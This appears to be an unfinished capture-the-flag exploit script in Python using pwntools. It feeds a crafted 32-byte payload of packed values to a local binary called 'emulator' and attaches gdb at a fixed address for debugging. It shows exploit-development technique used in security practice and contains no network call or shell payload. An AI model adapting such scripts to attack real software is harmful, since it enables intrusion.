#!/usr/bin/python
#coding=utf-8
from pwn import *
context.log_level = 'debug'
context.binary = './emulator'
context.terminal = ['gnome-terminal','-x','sh','-c']
p = process('./emulator')
def add(size,payload):
	p.recvuntil('>> ')
	p.sendline('1')
	p.sendlineafter(':\n',str(size))
	p.sendafter(':\n',payload)
def run():
	p.sendlineafter('>> ','2')

add(32,p32(0x2f000000)+p32(0x1000000)+p32(0x2000000)+p32(0x18000000))
gdb.attach(p,'''b *0x400A55''')
pause()
run()
pause()